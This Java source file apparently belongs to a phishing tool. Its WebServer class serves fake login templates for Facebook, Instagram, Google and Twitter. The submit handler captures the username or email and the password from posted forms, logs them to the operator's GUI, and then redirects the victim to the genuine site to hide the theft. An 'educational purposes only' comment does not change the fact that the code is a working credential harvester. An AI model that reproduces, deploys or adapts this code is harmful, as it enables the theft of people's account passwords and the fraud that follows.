package org.guercifzone;

import com.sun.net.httpserver.*;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;

public class WebServer {
    private HttpServer server;
    private int port;
    private String template;
    private GUI gui;
    private TemplateManager templateManager;

    public WebServer(int port, String template, GUI gui) throws IOException {
        this.port = port;
        this.template = template;
        this.gui = gui;
        this.templateManager = new TemplateManager();
    }

    public void start() throws IOException {
        server = HttpServer.create(new InetSocketAddress(port), 0);

        // Serve static files
        server.createContext("/", this::handleRoot);

        // Handle form submissions
        server.createContext("/submit", this::handleSubmit);

        server.setExecutor(null);
        server.start();
    }

    private void handleRoot(HttpExchange exchange) throws IOException {
        String path = exchange.getRequestURI().getPath();

        if (path.equals("/")) {
            serveTemplate(exchange);
        } else {
            serveStaticFile(exchange, path);
        }
    }

    private void serveTemplate(HttpExchange exchange) throws IOException {
        try {
            String htmlContent = templateManager.getTemplate(template);
            sendResponse(exchange, htmlContent, "text/html");
            gui.log("Served " + template + " template to " + getClientIP(exchange));
        } catch (IOException e) {
            send404(exchange);
        }
    }

    private void serveStaticFile(HttpExchange exchange, String path) throws IOException {
        try {
            String content = templateManager.getStaticFile(template, path);
            String contentType = getContentType(path);
            sendResponse(exchange, content, contentType);
        } catch (IOException e) {
            send404(exchange);
        }
    }

    private void handleSubmit(HttpExchange exchange) throws IOException {
        if ("POST".equals(exchange.getRequestMethod())) {
            String formData = new String(exchange.getRequestBody().readAllBytes());
            Map<String, String> params = parseFormData(formData);

            String username = params.get("username") != null ? params.get("username") : params.get("email");
            String password = params.get("password");

            if (username != null && password != null) {
                gui.logCredential(username, password);

                // Redirect to actual service (educational purposes only)
                String redirectUrl = getRedirectUrl(template);
                exchange.getResponseHeaders().set("Location", redirectUrl);
                exchange.sendResponseHeaders(302, -1);
                return;
            }
        }

        sendResponse(exchange, "Invalid request", "text/plain");
    }

    private Map<String, String> parseFormData(String formData) {
        Map<String, String> params = new HashMap<>();
        String[] pairs = formData.split("&");
        for (String pair : pairs) {
            String[] keyValue = pair.split("=");
            if (keyValue.length == 2) {
                try {
                    params.put(keyValue[0], URLDecoder.decode(keyValue[1], "UTF-8"));
                } catch (UnsupportedEncodingException e) {
                    // Ignore
                }
            }
        }
        return params;
    }

    private String getRedirectUrl(String template) {
        switch (template) {
            case "facebook": return "https://facebook.com";
            case "instagram": return "https://instagram.com";
            case "google": return "https://google.com";
            case "twitter": return "https://twitter.com";
            default: return "https://google.com";
        }
    }

    private String getContentType(String path) {
        if (path.endsWith(".css")) return "text/css";
        if (path.endsWith(".js")) return "application/javascript";
        if (path.endsWith(".png")) return "image/png";
        if (path.endsWith(".jpg") || path.endsWith(".jpeg")) return "image/jpeg";
        if (path.endsWith(".gif")) return "image/gif";
        return "text/plain";
    }

    private void sendResponse(HttpExchange exchange, String content, String contentType) throws IOException {
        exchange.getResponseHeaders().set("Content-Type", contentType);
        exchange.sendResponseHeaders(200, content.getBytes().length);
        try (OutputStream os = exchange.getResponseBody()) {
            os.write(content.getBytes());
        }
    }

    private void send404(HttpExchange exchange) throws IOException {
        String response = "404 Not Found";
        exchange.sendResponseHeaders(404, response.getBytes().length);
        try (OutputStream os = exchange.getResponseBody()) {
            os.write(response.getBytes());
        }
    }

    private String getClientIP(HttpExchange exchange) {
        return exchange.getRemoteAddress().getAddress().getHostAddress();
    }

    public void stop() {
        if (server != null) {
            server.stop(0);
        }
    }
}
